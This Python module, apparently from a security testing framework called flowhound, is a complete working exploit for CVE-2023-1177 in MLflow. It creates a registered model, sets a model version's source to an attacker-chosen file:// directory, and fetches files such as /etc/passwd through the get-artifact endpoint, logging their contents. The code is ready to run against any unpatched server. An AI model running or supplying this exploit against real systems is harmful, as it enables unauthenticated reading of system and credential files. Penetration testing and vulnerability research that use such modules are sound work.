import posixpath

import requests

from flowhound.vulnerabilities.auxiliary.base_auxiliary_class import AuxiliaryBaseClass
from flowhound.vulnerabilities.clients.mlflow import MLflowClient


class Auxiliary(AuxiliaryBaseClass):
    """
    CVE-2023-1177 — Unauthenticated arbitrary file read in MLflow via the
    model-registry source injection.

    Attack flow (three unauthenticated requests):

    1. ``POST /ajax-api/2.0/mlflow/registered-models/create``
       Creates a throwaway registered model with a random name.

    2. ``POST /ajax-api/2.0/mlflow/model-versions/create``
       Creates a model version whose ``source`` field is set to a
       ``file://`` URI pointing at the **directory** containing the target
       file (e.g. ``file:///etc/`` to read ``/etc/passwd``).
       MLflow stores this URI verbatim without validation.

    3. ``GET /model-versions/get-artifact?path=<filename>&name=<name>&version=1``
       Fetches the artifact.  MLflow resolves the path against the stored
       ``file://`` source URI and serves the file directly.

    Affected versions: MLflow ≤ 2.1.1
    Fixed in: 2.2.0
    CVSS: 9.8 (Critical)
    """

    _client_class = MLflowClient
    _DEFAULT_PATH = "/etc/passwd"

    # ---------------------------------------------------------------------------
    # Internal helpers
    # ---------------------------------------------------------------------------

    def _post(
        self,
        base_url: str,
        endpoint: str,
        payload: dict,
        headers: dict[str, str] | None = None,
        proxies: dict[str, str] | None = None,
        timeout: int = 10,
    ) -> requests.Response | None:
        try:
            return requests.post(
                base_url.rstrip("/") + endpoint,
                json=payload,
                headers=headers or {},
                proxies=proxies or {},
                timeout=timeout,
            )
        except Exception as e:  # noqa: BLE001
            self.logger.warning(f"Network error (POST {endpoint}): {e!s}")
            return None

    def _get(
        self,
        base_url: str,
        endpoint: str,
        params: dict | None = None,
        headers: dict[str, str] | None = None,
        proxies: dict[str, str] | None = None,
        timeout: int = 10,
    ) -> requests.Response | None:
        try:
            return requests.get(
                base_url.rstrip("/") + endpoint,
                params=params or {},
                headers=headers or {},
                proxies=proxies or {},
                timeout=timeout,
            )
        except Exception as e:  # noqa: BLE001
            self.logger.warning(f"Network error (GET {endpoint}): {e!s}")
            return None

    # ---------------------------------------------------------------------------
    # Public interface
    # ---------------------------------------------------------------------------

    def trigger_vuln(
        self,
        base_url: str,
        model_name: str,
        file_dir: str,
        filename: str,
        proxies: dict[str, str] | None = None,
    ) -> tuple[int, str] | None:
        """
        Execute the three-step exploit and return a ``(status_code, body)``
        tuple for the final artifact-fetch response, or ``None`` on network
        error.

        Parameters
        ----------
        base_url:   MLflow server base URL.
        model_name: Unique registered-model name to create (caller supplies).
        file_dir:   Absolute directory on the server containing the target
                    file (e.g. ``/etc``).  Used as the ``source`` URI:
                    ``file://<file_dir>/``.
        filename:   Filename within *file_dir* to read (e.g. ``passwd``).
        proxies:    Optional HTTP proxy dict.
        """
        # Step 1 — create registered model
        resp = self._post(
            base_url,
            "/ajax-api/2.0/mlflow/registered-models/create",
            {"name": model_name},
            proxies=proxies,
        )
        if resp is None:
            return None
        if resp.status_code != 200:
            self.logger.warning(
                f"Failed to create registered model (HTTP {resp.status_code}): {resp.text}"
            )
            return resp.status_code, resp.text

        # Step 2 — create model version with injected source URI
        source_uri = f"file://{file_dir.rstrip('/')}/"
        resp = self._post(
            base_url,
            "/ajax-api/2.0/mlflow/model-versions/create",
            {"name": model_name, "source": source_uri},
            proxies=proxies,
        )
        if resp is None:
            return None
        if resp.status_code != 200:
            self.logger.warning(
                f"Failed to create model version (HTTP {resp.status_code}): {resp.text}"
            )
            return resp.status_code, resp.text

        # Step 3 — fetch the target file via get-artifact
        resp = self._get(
            base_url,
            "/model-versions/get-artifact",
            params={"path": filename, "name": model_name, "version": "1"},
            proxies=proxies,
        )
        if resp is None:
            return None

        return resp.status_code, resp.text

    def run(
        self,
        base_url: str,
        f_path: str | None = None,
        username: str = "",
        password: str = "",
        proxies: dict[str, str] | None = None,
    ) -> bool:
        import uuid

        target_path = f_path if f_path is not None else self._DEFAULT_PATH
        # Split the caller-supplied path into directory + filename so we can
        # set source=file://<dir>/ and path=<filename> separately.
        file_dir = posixpath.dirname(target_path) or "/"
        filename = posixpath.basename(target_path)
        if not filename:
            self.logger.warning(f"Cannot determine filename from path: {target_path!r}")
            return False

        model_name = str(uuid.uuid4())

        self.logger.info("Probing CVE-2023-1177 (model-registry source injection)...")
        self.logger.info(
            f"Target: {base_url}  file: {target_path}  model: {model_name}"
        )

        result = self.trigger_vuln(
            base_url=base_url,
            model_name=model_name,
            file_dir=file_dir,
            filename=filename,
            proxies=proxies,
        )

        if result is None:
            return False

        status, body = result
        # Reject MLflow's error envelopes (empty JSON object/array) but treat a
        # genuine HTTP 200 — even with an empty body — as a successful read.
        # Some files (e.g. /proc/* virtual files) may produce no bytes via
        # shutil.copyfile while still proving the path traversal works.
        is_mlflow_error_envelope = body.strip() in ("{}", "[]")
        if status == 200 and not is_mlflow_error_envelope:
            byte_count = len(body)
            self.logger.info(
                f"Attack successful! Retrieved {byte_count} bytes via source injection."
            )
            if body:
                self.logger.info(f"Results:\n{body}")
            else:
                self.logger.info(
                    "File opened successfully (empty response body — "
                    "target file may be a virtual/empty file)."
                )
            return True

        self.logger.warning(
            "CVE-2023-1177: exploit failed — target may be patched or model registry disabled."
        )
        return False
